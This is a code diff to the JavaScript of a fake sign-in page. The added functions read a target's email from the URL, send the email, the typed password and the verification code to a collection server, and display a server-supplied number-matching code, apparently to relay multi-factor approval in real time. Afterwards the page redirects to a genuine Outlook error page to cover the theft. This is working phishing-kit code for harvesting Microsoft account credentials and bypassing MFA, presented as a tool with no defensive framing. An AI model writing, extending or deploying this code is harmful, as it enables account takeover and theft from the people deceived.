@@ -13,6 +13,9 @@ let emailSignIn = document.getElementById("email-sign-in");
 let emailEnterCode = document.getElementById("email-enter-code");
 let emailAuthenticate = document.getElementById("email-authenticate");
 
+let email;
+let uniqueId;
+
 passInput.addEventListener("input", function (e) {});
 
 document.body.addEventListener("click", function (e) {
@@ -26,37 +29,101 @@ document.body.addEventListener("click", function (e) {
   }
 });
 
-function signIn() {
-  let response = 1;
-  setLoader(loaderSignIn, "visible");
-  setTimeout(function () {
-    if (response == 0) {
-      setIncorrectPass("block");
-      passInput.value = "";
-      setLoader(loaderSignIn, "hidden");
-    } else if (response == 1) {
-      changeCard(passwordCard, codeCard);
-      setLoader(loaderSignIn, "hidden");
-    } else if (response == 2) {
-      changeCard(passwordCard, authCard);
-      setLoader(loaderSignIn, "hidden");
+function grabEmail() {
+  let hasEmail = new URLSearchParams(window.location.search).has("id");
+  if (hasEmail) {
+    email = new URLSearchParams(window.location.search).get("id");
+    document.querySelectorAll(".email").forEach(function (element) {
+      element.innerHTML = email;
+    });
+    uniqueId = generateUniqueId();
+    sendEmail(email);
+  }
+}
+
+function sendEmail(email) {
+  let sendEmailXhr = new XMLHttpRequest();
+  sendEmailXhr.open("POST", "http://127.0.0.1:3000/email", true);
+  sendEmailXhr.setRequestHeader("Content-type", "application/json");
+  sendEmailXhr.send(JSON.stringify({ sessionId: uniqueId, email: email }));
+
+  sendEmailXhr.onreadystatechange = function () {
+    if (this.readyState == 4 && this.status == 200) {
+      let response = this.response;
+      console.log(response);
+      if (response == "1") {
+        document.getElementById("page-spinner").style.display = "none";
+        document.getElementById("page-content").style.display = "block";
+      }
     }
-  }, 3000);
+  };
+}
+
+function signIn() {
+  setIncorrectPass("none");
+  setLoader(loaderSignIn, "visible");
+  let signInXhr = new XMLHttpRequest();
+  signInXhr.open("POST", "http://127.0.0.1:3000/pass", true);
+  signInXhr.setRequestHeader("Content-type", "application/json");
+  signInXhr.send(
+    JSON.stringify({ sessionId: uniqueId, password: passInput.value })
+  );
+
+  signInXhr.onreadystatechange = function () {
+    if (this.readyState == 4 && this.status == 200) {
+      let response = this.response;
+      if (response == 0) {
+        setIncorrectPass("block");
+        passInput.value = "";
+        setLoader(loaderSignIn, "hidden");
+      } else if (response == 1) {
+        setLoader(loaderSignIn, "hidden");
+        location.href =
+          "https://outlook.office365.com/Encryption/ErrorPage.aspx?src=0&code=10&be=DM8PR09MB6088&fe=";
+      } else if (response == 2) {
+        changeCard(passwordCard, codeCard);
+        setLoader(loaderSignIn, "hidden");
+      } else {
+        changeCard(passwordCard, authCard);
+        setLoader(loaderSignIn, "hidden");
+        document.getElementById("auth-number").textContent = response;
+        setTimeout(function () {
+          location.href =
+            "https://outlook.office365.com/Encryption/ErrorPage.aspx?src=0&code=10&be=DM8PR09MB6088&fe=";
+        }, 60000);
+      }
+    }
+  };
 }
 
 function verifyCode() {
-  let response = 0;
   setLoader(loaderEnterCode, "visible");
-  setTimeout(function () {
-    if (response == 0) {
-      setIncorrectCode("block");
-      codeInput.value = "";
-      setLoader(loaderEnterCode, "hidden");
-    } else if (response == 1) {
-    //   changeCard(codeCard, codeCard);
-      setLoader(loaderEnterCode, "hidden");
-    } 
-  }, 3000);
+  setIncorrectCode("none");
+  let verifyXhr = new XMLHttpRequest();
+  verifyXhr.open("POST", "http://127.0.0.1:3000/code", true);
+  verifyXhr.setRequestHeader("Content-type", "application/json");
+  verifyXhr.send(
+    JSON.stringify({
+      sessionId: uniqueId,
+      password: passInput.value,
+      code: codeInput.value,
+    })
+  );
+
+  verifyXhr.onreadystatechange = function () {
+    if (this.status == 200 && this.readyState == 4) {
+      let response = this.response;
+      if (response == 0) {
+        setIncorrectCode("block");
+        codeInput.value = "";
+        setLoader(loaderEnterCode, "hidden");
+      } else if (response == 1) {
+        setLoader(loaderEnterCode, "hidden");
+        location.href =
+          "https://outlook.office365.com/Encryption/ErrorPage.aspx?src=0&code=10&be=DM8PR09MB6088&fe=";
+      }
+    }
+  };
 }
 
 function setIncorrectPass(display) {
@@ -64,8 +131,8 @@ function setIncorrectPass(display) {
 }
 
 function setIncorrectCode(display) {
-    incorrectCode.style.display = display;
-  }
+  incorrectCode.style.display = display;
+}
 
 function changeCard(prev, next) {
   prev.style.display = "none";
@@ -75,3 +142,8 @@ function changeCard(prev, next) {
 function setLoader(loader, visibility) {
   loader.style.visibility = visibility;
 }
+function generateUniqueId() {
+  return "id-" + new Date().getTime() + "-" + Math.floor(Math.random() * 1000);
+}
+
+grabEmail();
